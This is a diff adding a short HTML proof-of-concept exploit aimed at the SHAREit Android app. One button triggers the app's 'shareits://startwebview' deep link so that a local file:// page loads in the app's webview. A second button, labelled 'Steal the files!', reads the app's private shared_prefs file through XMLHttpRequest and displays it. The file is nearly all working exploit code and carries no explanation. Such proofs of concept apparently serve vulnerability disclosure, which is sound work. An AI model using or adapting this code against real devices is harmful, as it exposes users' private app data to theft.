@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title>Display Data</title>
+    </head>
+    <body>
+        <button id="myButton" class="float-left submit-button">Load url!</button>
+        <button onclick="download()">Steal the files!</button>
+        <div id="dataDisplay"></div>
+    </body>
+    <script type="text/javascript">
+        document.getElementById("myButton").onclick = function () {
+            location.href = "shareits://startwebview/7?title=alooodo&&msg=ddd&image=aaeaaaaaaa&business-type=aaaaaa&webpage=aadaa&url=file:///storage/emulated/0/Download/exploit.html&is_hybrid=true&is_remotes=false&new_task=true";
+        };
+        function download() {
+            function theftFile(path, callback) {
+                var req = new XMLHttpRequest();
+                req.open("GET", "file://" + path, true);
+                req.onload = function(e) {
+                    callback(req.responseText);
+                }
+                req.onerror = function(e) {
+                    callback(null);
+                }
+                req.send();
+            }
+            var file = "/data/data/com.lenovo.anyshare.gps/shared_prefs/WebViewChromiumPrefs.xml";
+            theftFile(file, function(contents) {
+                if (contents) {
+                    document.getElementById("dataDisplay").innerText = contents;
+                } else {
+                    document.getElementById("dataDisplay").innerText = "Failed to load data.";
+                }
+            });
+        }
+    </script>
+</html>
